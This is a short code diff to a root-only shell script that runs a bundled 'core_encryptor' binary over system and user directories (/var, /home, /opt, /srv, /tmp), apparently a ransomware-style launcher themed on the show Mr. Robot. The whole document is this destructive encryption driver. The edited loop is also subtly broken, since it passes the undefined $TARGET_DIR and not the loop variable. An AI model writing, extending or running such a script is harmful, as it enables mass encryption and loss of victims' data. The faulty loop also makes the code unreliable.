@@ -5,7 +5,7 @@ if [ "$EUID" -ne 0 ]; then
   exit 1
 fi
 
-TARGET_DIR="/"
+TARGET_DIRS="/var /home /opt /srv /tmp"
 EXCLUDE_DIR="/fsociety"
 ENCRYPTOR_BIN="./tools/core_encryptor"
 
@@ -16,6 +16,11 @@ fi
 
 echo "[*] Encrypting..."
 
-"$ENCRYPTOR_BIN" "$TARGET_DIR" "$EXCLUDE_DIR"
+for DIR in $TARGET_DIRS; do
+  if [ -d "$DIR" ]; then
+    echo "[*] Encrypting data in $DIR..."
+    "$ENCRYPTOR_BIN" "$TARGET_DIR" "$EXCLUDE_DIR"
+  fi
+done
 
 echo "[+] Encrypted."
